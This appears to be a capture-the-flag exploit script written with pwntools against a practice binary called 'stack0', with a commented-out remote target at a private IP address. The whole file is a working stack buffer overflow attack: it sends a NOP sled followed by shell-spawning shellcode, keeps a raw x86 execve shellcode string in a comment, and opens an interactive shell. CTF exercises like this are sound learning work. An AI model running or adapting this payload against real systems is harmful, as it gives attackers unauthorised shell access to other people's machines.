from pwn import *
# io = remote("192.168.23.61", 20055)
# nc 192.168.23.61 20055
io = process("./stack0")
ELF("./stack0")

shellcode = shellcraft.sh()
shellcode = asm(shellcode)

# payload=fit({
#     64: shellcode
# })

payload = b"\x90" * 70
payload += shellcode
# payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"


io.sendline(payload)
io.interactive()

#flag{i_forgot_the_flag}
